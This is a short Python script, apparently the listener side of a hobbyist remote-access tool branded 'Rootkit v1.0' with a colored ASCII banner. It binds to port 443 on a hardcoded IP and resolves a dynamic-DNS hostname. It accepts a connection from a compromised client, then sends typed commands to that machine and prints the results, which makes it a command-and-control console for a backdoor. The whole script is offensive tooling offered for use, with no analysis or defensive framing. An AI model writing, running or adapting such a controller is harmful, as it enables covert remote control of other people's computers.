import socket as sock
import subprocess
from colorama import init, Fore

# initialize colorama

init()

# define colors

GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
RED   = Fore.RED
RESET = Fore.RESET


pic = '''

\033[1m\033[36m       _          _              _______   _   _                  \033[0m 
\033[1m\033[36m      | |        | |            |__   __| (_) | |                 \033[0m 
\033[1m\033[36m      | | __  __ | |__   __  __    | |     _  | |_    ___    _ __ \033[0m 
\033[1m\033[36m  _   | | \ \/ / | '_ \  \ \/ /    | |    | | | __|  / _ \  | '__|\033[0m 
\033[1m\033[36m | |__| |  >  <  | | | |  >  <     | |    | | | |_  | (_) | | |   \033[0m 
\033[1m\033[36m  \____/  /_/\_\ |_| |_| /_/\_\    |_|    |_|  \__|  \___/  |_|   \033[0m 

    

\033[1m\033[33mRootkit v1.0\033[0m ᕙ(0 o 0‶)ᕗ


'''

print(pic)



socket = sock.socket(sock.AF_INET,sock.SOCK_STREAM)

NO_IP = 'gubi.freedynamicdns.net'
LHOST = '192.168.36.121'
LPORT = 443

def check():
    IP = LHOST
    if NO_IP:
        IP = sock.gethostbyname(NO_IP)

    return str(IP)

def bindConnection():
    L_IP = check()
    print(L_IP)
    socket.bind((LHOST,LPORT))
    socket.listen(1)
    print(f'Listening {LPORT}..')
    connect, ipaddr = socket.accept()
    print(f'{GREEN}Connected to client{RESET} {ipaddr[0]}')

    while True:
        command = input('>')
        if(command == 'exit'):
            connect.send('exit'.encode('utf-8'))    
            connect.close()
            break
        connect.send(command.encode('utf-8'))
        data = connect.recv(1024).decode()
        print(data)


bindConnection()
